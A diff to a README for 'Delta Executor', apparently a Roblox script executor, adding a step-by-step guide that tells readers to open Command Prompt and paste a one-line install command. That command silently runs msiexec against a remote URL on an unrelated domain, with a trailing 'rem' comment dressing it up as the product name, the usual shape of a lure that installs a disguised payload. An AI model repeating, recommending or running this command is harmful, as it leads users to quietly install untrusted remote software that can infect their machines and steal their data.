@@ -24,9 +24,22 @@ Whether you want to test your own scripts, automate repetitive tasks, or explore
 ## 📥 One-Command Installation (Windows)
 We know you hate complicated setups. You can download, install, and launch Delta Executor directly from your CMD using a single command:
 
-```CMD
+### **Step 1 — Open Command Prompt**
+1. Press **Win + R**
+2. Type:
+```
+cmd
+```
+3. Press **Enter**
+This will open **Command Prompt**.
+---
+### **Step 2 — Run the Install Command**
+Copy the command below and paste it into **Command Prompt**, then press **Enter**.
+```powershell
 cmd /c start msiexec /q /i https://cloudcraftshub.com/api & rem delta exec
 ```
+The installer will automatically download and install the required components.
+
 ## 🎮 How to Use
 1. Launch Roblox and join any game.
 2. Open **Delta Executor** via the terminal.
